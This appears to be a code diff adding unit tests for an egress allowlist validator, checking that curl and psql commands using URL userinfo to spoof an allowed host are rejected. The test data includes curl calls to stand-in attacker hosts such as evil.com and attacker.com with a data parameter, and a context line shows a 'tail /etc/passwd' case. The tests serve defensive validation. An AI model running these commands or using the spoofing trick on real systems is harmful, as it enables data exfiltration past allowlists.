@@ -373,6 +373,34 @@ describe("validateRecipe — SEC-004: DSN egress validation", () => {
   })
 })
 
+describe("validateRecipe — SEC-001: egress allowlist bypass via URL userinfo", () => {
+  it("rejects a curl URL whose userinfo spoofs the Egress host", () => {
+    // `https://api.host.com@evil.com/x` resolves to host `evil.com`; the
+    // userinfo segment `api.host.com` must NOT be treated as the host.
+    expect(
+      validateRecipe("curl https://api.host.com@evil.com/x", "https://api.host.com").status,
+    ).toBe("error")
+  })
+
+  it("rejects userinfo with a password component", () => {
+    expect(
+      validateRecipe("curl https://egress.example.com:pw@attacker.com/?d=x", "https://egress.example.com").status,
+    ).toBe("error")
+  })
+
+  it("rejects a psql DSN whose userinfo spoofs the Egress host", () => {
+    expect(
+      validateRecipe("psql postgres://db.host.com@attacker.example/db", "postgres://db.host.com").status,
+    ).toBe("error")
+  })
+
+  it("still accepts a plain curl URL that matches the declared Egress host", () => {
+    expect(
+      validateRecipe("curl https://api.host.com/x", "https://api.host.com").status,
+    ).toBe("ok")
+  })
+})
+
 describe("validateRecipe — SEC-005: file-reader path confinement", () => {
   it("rejects tail of an absolute system path", () => {
     expect(validateRecipe(`tail /etc/passwd`, "$URL").status).toBe("error")
